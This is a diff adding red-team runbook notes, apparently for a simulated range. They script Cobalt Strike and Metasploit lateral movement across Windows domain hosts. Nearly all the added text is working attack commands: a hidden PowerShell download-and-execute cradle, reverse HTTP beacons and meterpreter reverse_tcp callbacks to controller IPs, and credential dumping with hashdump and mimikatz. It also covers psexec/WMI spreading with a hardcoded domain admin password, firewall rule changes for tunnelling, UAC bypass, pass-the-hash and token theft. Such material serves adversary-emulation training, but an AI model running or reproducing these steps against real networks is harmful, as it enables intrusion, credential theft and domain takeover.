@@ -138,4 +138,567 @@ Needs admin privs
 
 Misc
      shell nltest /dclist:<domain>                   Locate the domain controller
+------------------------------------------------------------------------------------------------------
+
+Lateral Movement
+
+Always use a FQDN instead of an IP.
+If you have remote access to a VM, but can’t use psexec, reboot it and login as a domain user.
+
+Domain users:
+Get-DomainUser -Domain acme.com -DomainController 10.0.0.2 | findstr samaccountname
+Domain admins:
+Get-DomainGroupMember -identity "Domain Admins" -Domain acme.com -DomainController 10.0.0.2 | findstr MemberName
+Shares that our current user is able to access:
+Find-DomainShare -CheckShareAccess -Domain acme.com -DomainController 10.0.0.2
+------------------------------------------------------------------------------------------------------
+
+# Scenario 33
+
+172.31.2.4	wkstn-02
+172.31.2.70	wkuser-70
+172.31.4.5	site-file
+172.31.4.4	site-dc
+
+Summary: 40 min test emulating a lateral movement between one victim egress host and four other hosts, that uses SMB for lateral movement, as well as follow-on victim to victim communications.
+
+Controller domain: strikingcobalt.ru
+Controller IP: 91.10.245.193
+
+ssh in-kali
+ifconfig eth0 add 91.10.245.193
+cd /opt/cobaltstrike/
+rm data/*.bin
+./teamserver 172.16.100.32 redteam /opt/cobaltstrike-profiles/APT/etumbot.profile
+
+Using OS X, start Cobalt Strike and point to localhost.
+
+Cobalt Strike > Listeners > Add
+Name: http
+Payload: windows/beacon_http/reverse_http
+Host: 91.10.245.193
+Port: 80
+Save > strikingcobalt.ru > Ok > Ok
+
+Add
+Name: smb
+Payload: windows/beacon_smb/bind_pipe
+Host: 172.16.100.32
+Port: 9876
+Save
+
+Attacks > Web Drive-by > Scripted Web Delivery > Launch
+Copy the PowerShell text > Ok
+powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://172.16.100.32:80/a'))"
+
+Login to wkstn-02 as Administrator, open a command prompt, and paste in the PowerShell.
+You should have an http beacon on Cobalt Strike in about 10 sec.
+
+Right click on the new http beacon > Interact
+sleep 0                                                 Make the beacon interactive
+note foothold
+ps                                                      Look for another user logged in
+inject <PID> <Arch> <listener>
+inject 5678 x64 smb
+Right click on the new smb beacon > Interact
+hashdump                                                Recover local account password hashes
+logonpasswords                                          Harvest credentials with mimikatz
+View > Credentials
+
+shell net view /domain                                  Show the domain
+make_token site\administrator Simspace1!Simspace1!
+shell net group "Domain Computers" /DOMAIN              Show computers joined to the domain
+shell nltest /dclist:SITE                               Locate the domain controller
+ls \\wkuser-70\C$                                       Test remote access
+psexec_psh wkuser-70 smb                                You should have a new smb beacon in about 10 sec
+
+Right click on the new smb beacon > Interact
+sleep 0
+note 1st hop
+ps
+hashdump
+logonpasswords
+make_token site\administrator Simspace1!Simspace1!
+ls \\site-file\C$
+psexec_psh site-file smb
+
+Right click on the new http beacon > Interact
+sleep 0
+note 2nd hop
+ps
+hashdump
+logonpasswords
+make_token site\administrator Simspace1!Simspace1!
+ls \\site-dc\C$
+psexec_psh site-dc smb	
+	
+Right click on the new http beacon > Interact
+sleep 0
+note 3rd hop
+------------------------------------------------------------------------------------------------------
+
+# Scenario 34
+
+Host List: 172.31.2.67, 172.31.4.4, 172.31.2.1, 172.31.2.2, 172.31.2.3, 172.31.2.4, 172.31.2.5, 172.31.2.6
+
+Summary: 120 min test emulating a lateral movement between one victim egress host and the site domain controller, 
+which then laterally moves to five systems at once and exfiltrates data over a chain of SMB communications.
+
+Controller Domain: kobaltstrikez.be
+Controller IP: 135.198.17.99
+
+ssh in-kali
+ifconfig eth0 add 135.198.17.99
+cd /opt/cobaltstrike/
+rm data/*.bin
+./teamserver 172.16.100.32 redteam /opt/cobaltstrike-profiles/APT/etumbot.profile
+
+Using OS X, start Cobalt Strike and point to localhost.
+
+Cobalt Strike > Listeners > Add
+Name: http
+Payload: windows/beacon_http/reverse_http
+Host: 135.198.17.99
+Port: 80
+Save > kobaltstrikez.be > Ok > Ok
+
+Add
+Name: smb
+Payload: windows/beacon_smb/bind_pipe
+Host: 172.16.100.143
+Port: 9876
+Save
+
+Attacks > Web Drive-by > Scripted Web Delivery > Launch
+Copy the PowerShell text > Ok
+powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://172.16.100.32:80/a'))"
+
+Login to wkuser-67 as Administrator, open a command prompt, and paste in the PowerShell.
+You should have an http beacon on Cobalt Strike in about 10 sec.
+   
+Right click on the new http beacon > Interact
+sleep 0                                                 Make the beacon interactive
+note foothold
+ps                                                      Look for another user logged in
+inject <PID> <Arch> <listener>
+inject 5678 x64 smb
+Right click on the new smb beacon > Interact
+hashdump                                                Recover local account password hashes
+logonpasswords                                          Harvest credentials with mimikatz
+View > Credentials
+
+shell net view /domain                                  Show the domain
+make_token site\administrator Simspace1!Simspace1!
+shell net group "Domain Computers" /DOMAIN              Show computers joined to the domain
+shell nltest /dclist:SITE                               Locate the domain controller
+ls \\wkstn-02\C$                                        Test remote access
+psexec_psh site-dc smb                                  You should have a new beacon in about 10 sec
+
+Right click on the new smb beacon > Interact
+sleep 0
+note first hop
+
+View > Targets > Add
+Address: 172.31.2.1
+Name: wkstn-cdr
+os: Windows 7
+Save
+
+Add
+Address: 172.31.2.2
+Name: wkstn-dco
+os: Windows 7
+Save
+
+Add
+Address: 172.31.2.3
+Name: wkstn-01
+os: Windows 7
+Save
+
+Add
+Address: 172.31.2.4
+Name: wkstn-02
+os: Windows 7
+Save
+
+Add
+Address: 172.31.2.5
+Name: wkstn-03
+os: Windows 7
+Save
+
+Right click on 172.31.2.1 > Login > psexec
+Listener: smb
+Session: ... > first hop > Choose
+Check Use session's current access token
+Launch > Repeat on remaining targets.
+------------------------------------------------------------------------------------------------------
+
+# Scenario 37
+
+Host List: 172.31.2.67, 172.31.2.4, 172.31.2.68, 172.31.4.4, 172.31.4.5, 172.31.2.72
+
+Summary: 40 min test emulating an SMB lateral movement between one victim egress host and a host, followed by a non-smb lateral movement to a third host, which then uses SMB for lateral movement to a fourth, fifth, and sixth host.
+
+Plan of attack: 
+wkuser-67 - psexec > wkstn-02 - WMI > wkuser-68 - psexec > site-dc - psexec > site-file > wkuser-72
+
+ssh in-kali
+cd /opt/cobaltstrike/
+rm data/*.bin
+./teamserver 172.16.100.32 redteam /opt/cobaltstrike-profiles/APT/etumbot.profile
+
+Using OS X, start Cobalt Strike and point to localhost.
+
+Cobalt Strike > Listeners > Add
+Name: http
+Payload: windows/beacon_http/reverse_http
+Host: 172.16.100.32
+Port: 80
+Save > 172.16.100.32 > Ok > Ok
+
+Add
+Name: smb
+Payload: windows/beacon_smb/bind_pipe
+Host: 172.16.100.32
+Port: 9876
+Save
+
+Attacks > Web Drive-by > Scripted Web Delivery > Launch
+Copy the PowerShell text > Ok
+powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://172.16.100.32:80/a'))"
+
+Login to wkuser-67 as Administrator, open a command prompt, and paste in the PowerShell.
+You should have an http beacon on Cobalt Strike in about 10 sec.
+
+Right click on the new http beacon > Interact
+sleep 0                                                 Make the beacon interactive
+note foothold
+ps                                                      Look for another user logged in
+inject <PID> <Arch> <listener>
+inject 5678 x64 smb
+Right click on the new smb beacon > Interact
+hashdump                                                Recover local account password hashes
+logonpasswords                                          Harvest credentials with mimikatz
+View > Credentials
+
+shell net view /domain                                  Show the domain
+make_token site\administrator Simspace1!Simspace1!
+shell net group "Domain Computers" /DOMAIN              Show computers joined to the domain
+shell nltest /dclist:SITE                               Locate the domain controller
+ls \\wkstn-02\C$                                        Test remote access
+psexec_psh wkstn-02 http                                You should have a new beacon in about 10 sec
+
+Right click on the new http beacon > Interact
+sleep 0
+note LM
+ps
+hashdump
+logonpasswords
+make_token site\administrator Simspace1!Simspace1!
+ls \\wkuser-68\C$
+wmi wkuser-68 http
+
+Right click on the new beacon > Interact
+sleep 0
+note 2nd LMps
+ps
+hashdump
+logonpasswords
+make_token site\administrator Simspace1!Simspace1!
+ls \\site-dc\C$
+psexec_psh site-dc smb
+
+Right click on the new beacon > Interact
+sleep 0
+note 2nd LM - 1st hop
+ps
+hashdump
+logonpasswords
+make_token site\administrator Simspace1!Simspace1!
+ls \\site-file\C$
+psexec_psh site-file smb
+
+Right click on the new beacon > Interact
+sleep 0
+note 2nd LM - 2nd hop
+ps
+hashdump
+logonpasswords
+make_token site\administrator Simspace1!Simspace1!
+ls \\wkuser-72\C$
+psexec_psh wkuser-72 smb
+
+Right click on the new beacon > Interact
+sleep 0
+note 2nd LM - 3rd hop
+------------------------------------------------------------------------------------------------------
+
+# Scenario 40
+
+172.31.2.4	wkstn-02
+172.31.2.66	wkuser-66
+172.31.2.3	wkstn-01
+172.31.2.67	wkuser-67
+172.31.2.5	wkstn-03
+172.31.2.68	wkuser-68
+172.31.2.6	wkstn-04
+172.31.2.69	wkuser-69
+172.31.4.4	site-dc
+172.31.2.70	wkuser-70
+
+ssh in-kali
+cd /opt/cobaltstrike/
+rm data/*.bin
+./teamserver 172.16.100.32 redteam /opt/cobaltstrike-profiles/APT/etumbot.profile
+
+Using OS X, start Cobalt Strike and point to localhost.
+
+Cobalt Strike > Listeners > Add
+Name: http
+Payload: windows/beacon_http/reverse_http
+Host: 172.16.100.32
+Port: 80
+Save > 172.16.100.32 > Ok > Ok
+
+Add
+Name: smb
+Payload: windows/beacon_smb/bind_pipe
+Host: 172.16.100.32
+Port: 9876
+Save
+
+Attacks > Web Drive-by > Scripted Web Delivery > Launch
+Copy the PowerShell text > Ok
+powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://172.16.100.32:80/a'))"
+
+Login to wkstn-02 as Administrator, open a command prompt, and paste in the PowerShell.
+You should have an http beacon on Cobalt Strike in about 10 sec.
+
+Right click on the new http beacon > Interact
+sleep 0                                                         Make the beacon interactive
+note foothold
+ps                                                              Look for another user logged in
+  inject <PID> <Arch> <listener>
+  inject 5678 x64 smb
+  Right click on the new smb beacon > Interact
+hashdump                                                        Recover local account password hashes
+logonpasswords                                                  Harvest credentials with mimikatz
+View > Credentials
+
+shell net view /domain                                          Show the domain
+make_token site\administrator Simspace1!Simspace1!
+shell net group "Domain Computers" /DOMAIN                      Show computers joined to the domain
+shell nltest /dclist:SITE                                       Locate the domain controller
+ls \\wkuser-66\C$                                               Test remote connectivity
+psexec_psh wkuser-66 smb                                        You should have a new beacon in about 10 sec
+
+Right click on the new smb beacon > Interact
+sleep 0
+note 1st hop
+ps
+hashdump
+logonpasswords
+make_token site\administrator Simspace1!Simspace1!
+ls \\wkstn-01\C$	
+psexec_psh wkstn-01 smb
+
+Right click on the new smb beacon > Interact
+sleep 0
+note 2nd hop
+ps
+hashdump
+logonpasswords
+make_token site\administrator Simspace1!Simspace1!
+ls \\wkuser-67\C$
+psexec_psh wkuser-67 smb
+
+Right click on the new smb beacon > Interact
+sleep 0
+note 3rd hop
+ps
+hashdump
+logonpasswords
+make_token site\administrator Simspace1!Simspace1!
+ls \\wkstn-03\C$	
+psexec_psh wkstn-03 smb
+
+Right click on the new smb beacon > Interact
+sleep 0
+note 4th hop
+ps
+hashdump
+logonpasswords
+make_token site\administrator Simspace1!Simspace1!
+ls \\wkuser-68\C$
+psexec_psh wkuser-68 smb
+Right click on the new smb beacon > Interact
+sleep 0
+note 5th hop
+ps
+hashdump
+logonpasswords
+make_token site\administrator Simspace1!Simspace1!
+ls \\wkstn-04\C$	
+psexec_psh wkstn-04 smb
+
+Right click on the new smb beacon > Interact
+sleep 0
+note 6th hop
+ps
+hashdump
+logonpasswords
+make_token site\administrator Simspace1!Simspace1!
+ls \\wkuser-69\C$
+psexec_psh wkuser-69 smb
+
+Right click on the new smb beacon > Interact
+sleep 0
+note 7th hop
+ps
+hashdump
+logonpasswords
+make_token site\administrator Simspace1!Simspace1!
+ls \\site-dc\C$
+psexec_psh site-dc smb	
+
+Right click on the new smb beacon > Interact
+sleep 0
+note 8th hop
+ps
+hashdump
+logonpasswords
+make_token site\administrator Simspace1!Simspace1!
+ls \\wkuser-70\C$
+psexec_psh wkuser-70 smb
+
+Right click on the new smb beacon > Interact
+sleep 0
+note 9th hop
+------------------------------------------------------------------------------------------------------
+
+# Other notes
+
+# Catch the callback from wkstn-04
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 200.200.200.80
+set lport 443
+run
+migrate -N explorer.exe
+
+# Make tunnels for wkuser-66
+upload fpipeknockoff.windows.amd64.exe s:\\
+shell
+netsh advfirewall firewall delete rule  name="fpipeknockoff" program="\\site-file\share\fpipeknockoff.windows.amd64.exe" & netsh advfirewall firewall add rule name="fpipeknockoff" dir=in action=allow program="\\site-file\share\fpipeknockoff.windows.amd64.exe" enable=yes & \\site-file\share\fpipeknockoff.windows.amd64.exe -c 200.200.200.80:443 <NUL >NUL 2>NUL & exit
+run post/multi/manage/autoroute CMD=add netmask=/32 subnet=172.31.2.66
+background
+
+# Make connection to wkuser-66
+use exploit/windows/smb/psexec_psh
+set payload windows/x64/meterpreter/reverse_tcp
+set rhost 172.31.2.66
+set service_name kittens
+set smbdomain site
+set smbpass Simspace1!Simspace1!
+set smbuser administrator
+set lhost 172.31.2.6
+set lport 4444
+set ReverseListenerBindAddress 0.0.0.0
+set ReverseListenerBindPort 443
+run
+migrate -N svchost.exe
+
+# Make tunnels for site-mail
+shell
+netsh advfirewall firewall delete rule name="fpipeknockoff" program="\\site-file\share\fpipeknockoff.windows.amd64.exe" & netsh advfirewall firewall add rule name="fpipeknockoff" dir=in action=allow program="\\site-file\share\fpipeknockoff.windows.amd64.exe" enable=yes & \\site-file\share\fpipeknockoff.windows.amd64.exe -c 172.31.2.6:4444 & exit
+run post/multi/manage/autoroute CMD=add netmask=/32 subnet=172.31.4.9
+background
+
+# Make connection to site-mail
+use exploit/windows/smb/psexec_psh
+set payload windows/x64/meterpreter/reverse_tcp
+set rhost 172.31.4.9
+set service_name kittens
+set smbdomain site
+set smbpass Simspace1!Simspace1!
+set smbuser administrator
+set lhost 172.31.2.66
+set lport 4444
+set ReverseListenerBindAddress 0.0.0.0
+set ReverseListenerBindPort 443
+run
+migrate -N svchost.exe
+
+# Make tunnels to wkuser-72
+shell
+netsh advfirewall firewall delete rule  name="fpipeknockoff" program="\\site-file\share\fpipeknockoff.windows.amd64.exe" & netsh advfirewall firewall add rule name="fpipeknockoff" dir=in action=allow program="\\site-file\share\fpipeknockoff.windows.amd64.exe" enable=yes & \\site-file\share\fpipeknockoff.windows.amd64.exe -c 172.31.2.66:4444 & exit
+run post/multi/manage/autoroute CMD=add netmask=/32 subnet=172.31.2.72
+background
+
+# Make connection to wkuser-72
+use exploit/windows/smb/psexec_psh
+set payload windows/x64/meterpreter/reverse_tcp
+set rhost 172.31.2.72
+set service_name kittens
+set smbdomain site
+set smbpass Simspace1!Simspace1!
+set smbuser administrator
+set lhost 172.31.4.9
+set lport 4444
+set ReverseListenerBindAddress 0.0.0.0
+set ReverseListenerBindPort 443
+run
+migrate -N svchost.exe
+
+# CS 3.0 preview: https://www.youtube.com/channel/UCJU2r634VNPeCRug7Y7qdcw
+
+Create http and smb listeners.
+Launch an attack to gain a foothold.
+
+Right click on the new http beacon > Interact
+sleep 0
+shell whoami /groups                                            Part of the Administrators group
+     Running in a medium integrity context
+     Need to elevate our privileges
+bypassuac smb                                                   Now running in a high integrity context (see the asterisks)
+
+Right click on the new smb beacon > Interact
+sleep 0
+ps                                                              Look for another user logged in
+inject <PID> <Arch> <listener>
+inject 4820 x64 smb
+
+Right click on the new smb beacon > Interact
+sleep 0
+hashdump
+logonpasswords
+View > Credentials
+
+shell net view /domain                                          Show the domain
+shell nltest /dclist:CORP                                       Locate the domain controller
+shell net group "Domain Computers" /DOMAIN                      Show computers joined to the domain
+
+ls \\target2\C$                                                 Test remote access. Access is denied
+     Scroll up and copy the admin hash
+pth Administrator <LM hash>:<NTLM hash> powershell -w hidden
+
+steal_token <NTLM PID>
+ls \\target2\C$See if you have trust to the next target
+     We do. So lateral move using WMI
+wmi target2 smb
+rev2self                                                        Drop the current token
+
+powershell-import /opt/PowerSploit/Recon/PowerView.ps1
+powerpick Find-LocalAdminAccess
+
+psexec fileserver ADMIN$ smb
+
+Right click on the new smb beacon > Interact
+sleep 0
+note fileserver
+ps                                                              A domain admin is logged on
+steal_token <PID>
+psexec dc SYSVOL smb
 
